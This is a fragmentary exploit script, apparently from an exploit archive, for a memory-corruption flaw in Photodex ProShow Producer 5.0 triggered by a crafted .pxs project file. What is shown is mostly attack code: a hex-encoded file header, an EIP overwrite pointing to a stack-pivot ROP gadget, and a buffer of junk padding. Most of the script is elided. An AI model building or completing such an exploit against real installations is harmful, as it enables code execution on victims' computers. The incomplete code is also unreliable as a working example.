...
# Exploit Title: Photodex ProShow Producer v5.0.3297 (.pxs) Memory 
...
# Notes:         -
# Howto:         Use app to open the .pxs file
...
head = 
("\x50\x68\x6F\x74\x6F\x64\x65\x78\x20\x50\x72\x65\x73\x65\x6E\x74\x65\x72\x20\x53"+
...
eip=pack('<L',0x1013bf20) # {pivot 164 / 0xa4} :  # POP ESI # POP EBP # 
POP EBX # ADD ESP,98 # RETN 0x10 [if.dnt] 
junk2="\x41" * 1000
